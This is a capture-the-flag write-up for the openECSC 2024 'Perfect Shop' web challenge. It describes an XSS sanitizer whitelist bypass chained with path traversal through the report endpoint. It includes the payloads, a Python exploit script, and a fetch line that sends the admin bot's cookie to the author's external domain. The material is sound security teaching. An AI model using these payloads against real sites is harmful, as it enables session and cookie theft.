# Perfect Shop

## Description
```
Do you like perfect things? Check out my new online shop!

Site: http://perfectshop.challs.open.ecsc2024.it
```

## Provided Files
```
perfectshop.zip
```

## Writeup

Starting off, I took a look at the provided files and searched for the occurance of flag. <br/>
```js
const FLAG = process.env.FLAG || 'openECSC{this_is_a_fake_flag}';

app.post('/report', (req, res) => {
    const id = parseInt(req.body.id);
        if (isNaN(id) || id < 0 || id >= products.length) {
        res.locals.errormsg = 'Invalid product ID';
        res.render('report', { products: products });
        return;
    }

    fetch(`http://${HEADLESS_HOST}/`, { 
        method: 'POST', 
        headers: { 'Content-Type': 'application/json', 'X-Auth': HEADLESS_AUTH },
        body: JSON.stringify({ 
            actions: [
                {
                    type: 'request',
                    url: `http://${WEB_DOM}/`,
                },
                {
                    type: 'set-cookie',
                    name: 'flag',
                    value: FLAG
                },
                {
                    type: 'request',
                    url: `http://${WEB_DOM}/product/${req.body.id}`
                },
                {
                    "type": "sleep",
                    "time": 1
                }
            ]
         })
    }).then((r) => {
        if (r.status !== 200) {
            res.locals.errormsg = 'Report submission failed, contact an admin if the problem persists';
        } else {
            res.locals.successmsg = 'Report submitted successfully';
        }
        res.render('report', { products: products });
    }).catch(() => {
        res.locals.errormsg = 'Failed to submit report, contact an admin if the problem persists';
        res.render('report', { products: products });
    });
});
```

Seeing a `report` endpoint which sends a request I instantly thought of a `XSS` type vulnerability. <br/>
The second thing I took a look at was the `XSS` sanitizer which was implemented via the js library `perfect-express-sanitizer`. <br/>
The important thing to notice there was the whitelisting of the path `/admin`. <br/>
```js
app.use(sanitizer.clean({ xss: true }, ["/admin"]));



const sanitize = require("./modules/");

function middleware(
  options = {},
  whiteList = [],
  only = ["body", "params", "headers", "query"]
) {
  return (req, res, next) => {
    only.forEach((k) => {
      if (req[k] && !whiteList.some((v) => req.url.trim().includes(v))) {
        console.log(req.url)
        console.log(whiteList)
        req[k] = sanitize.prepareSanitize(req[k], options);
      }
    });
    next();
  };
}

module.exports = {
  clean: middleware,
  sanitize,
};
```

Taking a look at the code of the used javascript library I realised that the whitelist check was kind of faulty. <br/>
```js
!whiteList.some((v) => req.url.trim().includes(v))
```

The issue above is that the `/admin` could be anywhere in the URL and therefore disable the sanitization of our passed payload. <br/>
Testing this exploit I created the payload below. <br/>
```
http://perfectshop.challs.open.ecsc2024.it/search?q=%3Cimg%20src=%22/admin%22%20onerror=%22alert(%271%27)%22/%3E
```

Now that I had a working `XSS` fire, I took another look at the `report` feature where the flag is being passed along and the `search` endpoint which allows the execution of `XSS`. <br/>
```js
app.get('/search', (req, res) => {
    let query = req.query.q || '';

    if (query.length > 50) {
        res.locals.errormsg = 'Search query is too long';
        query = '';
    }

    const result = products.filter(product => product.name.toLowerCase().includes(query.toLowerCase()));

    res.render('search', { products: result, query: query });
});


app.post('/report', (req, res) => {
    const id = parseInt(req.body.id);
        if (isNaN(id) || id < 0 || id >= products.length) {
        res.locals.errormsg = 'Invalid product ID';
        res.render('report', { products: products });
        return;
    }

    fetch(`http://${HEADLESS_HOST}/`, { 
        method: 'POST', 
        headers: { 'Content-Type': 'application/json', 'X-Auth': HEADLESS_AUTH },
        body: JSON.stringify({ 
            actions: [
                {
                    type: 'request',
                    url: `http://${WEB_DOM}/`,
                },
                {
                    type: 'set-cookie',
                    name: 'flag',
                    value: FLAG
                },
                {
                    type: 'request',
                    url: `http://${WEB_DOM}/product/${req.body.id}`
                },
                {
                    "type": "sleep",
                    "time": 1
                }
            ]
         })
    }).then((r) => {
        if (r.status !== 200) {
            res.locals.errormsg = 'Report submission failed, contact an admin if the problem persists';
        } else {
            res.locals.successmsg = 'Report submitted successfully';
        }
        res.render('report', { products: products });
    }).catch(() => {
        res.locals.errormsg = 'Failed to submit report, contact an admin if the problem persists';
        res.render('report', { products: products });
    });
});
```

The first important thing to keep in mind is the max query length of the search query. <br/>
This meant that I could only send a `XSS` payload which is 50 characters long. <br/>
The other important thing in the `report` endpoint was the `isNaN()` check. <br/>
These number checks could easily be bypassed using a number at the first position of the payload. <br/>
Knowing this I tried to test another small trick which was to navigate from `/product/ID` to `/search?q=`. <br/>
```
http://perfectshop.challs.open.ecsc2024.it/product/1/../../search?q=<img src="/admin" onerror="alert('1')"/>
```

Confirming my theory I now had to think about the `50-char-cap`. <br/>
The first solution I thought of was loading an eternal script from my domain `aryt3.dev`. <br/>
To test this I actually setup a small script which could be accessed via `http://aryt3.dev/admin`. <br/>
This was necessary to bypass the whitelist-check. <br/>
After testing my theory by executing the query `/search?q=<script src='https://aryt3.dev/admin'></script>` I confirmed that the exploit was working. <br/>
After reading the format which was being used by the `/report` endpoint I made a small python script to support the `XSS` execution. <br/>
```py
import requests
from urllib.parse import quote

base_URL = 'http://perfectshop.challs.open.ecsc2024.it/'

url_encoded_sh1t = quote("<script src='https://aryt3.dev/admin'></script>")

payload = {
    'id': f'1/../../search?q={url_encoded_sh1t}&/admin'
}

res = requests.post(f'{base_URL}report', data=payload)
```

The script basically pulls the `javascript snippet` below. <br/>
```js
fetch(`http://aryt3.dev/${document.cookie}`)
```

Using this I executed the script and patiently waited for a request in my `nginx-access-log`. <br/>
```
XXX.XXX.XXX.XXX - - [20/Mar/2024:21:50:50 +0100] "GET /admin HTTP/1.1" 404 125 "http://perfectshop.challs.open.ecsc2024.it/" "firefox-headless-agent"
XXX.XXX.XXX.XXX - - [20/Mar/2024:21:52:22 +0100] "GET /admin HTTP/1.1" 200 46 "http://perfectshop.challs.open.ecsc2024.it/" "firefox-headless-agent"
XXX.XXX.XXX.XXX - - [20/Mar/2024:21:52:22 +0100] "GET /undefined HTTP/1.1" 301 169 "http://perfectshop.challs.open.ecsc2024.it/" "firefox-headless-agent"
XXX.XXX.XXX.XXX - - [20/Mar/2024:21:52:30 +0100] "GET /admin HTTP/1.1" 200 46 "http://perfectshop.challs.open.ecsc2024.it/" "firefox-headless-agent"
XXX.XXX.XXX.XXX - - [20/Mar/2024:21:52:31 +0100] "GET /undefined HTTP/1.1" 301 169 "http://perfectshop.challs.open.ecsc2024.it/" "firefox-headless-agent"
XXX.XXX.XXX.XXX - - [20/Mar/2024:21:53:08 +0100] "GET /admin HTTP/1.1" 200 45 "http://perfectshop.challs.open.ecsc2024.it/" "firefox-headless-agent"
XXX.XXX.XXX.XXX - - [20/Mar/2024:21:53:08 +0100] "GET /flag=openECSC%7B4in't_s0_p3rfect_aft3r_4ll%7D HTTP/1.1" 301 169 "http://perfectshop.challs.open.ecsc2024.it/" "firefox-headless-agent"
```

This revealed the URL-encoded flag which concludes this writeup.

